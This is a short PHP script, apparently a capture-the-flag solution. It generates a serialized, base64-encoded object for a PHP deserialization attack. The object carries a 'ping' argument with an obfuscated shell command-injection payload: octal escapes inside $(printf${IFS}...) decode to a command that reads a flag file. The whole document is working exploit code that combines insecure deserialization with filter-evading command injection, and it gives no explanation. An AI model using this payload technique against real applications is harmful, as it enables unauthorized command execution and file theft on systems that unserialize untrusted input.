<?php

class ease
{
	private $method;
	private $args;

	function __construct($method, $args)
	{
		$this->method = $method;
		$this->args = $args;
	}
}

$a = new ease("ping",array('$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'));
$b = serialize($a);
var_dump($b);
echo'</br>';
echo base64_encode($b);

?>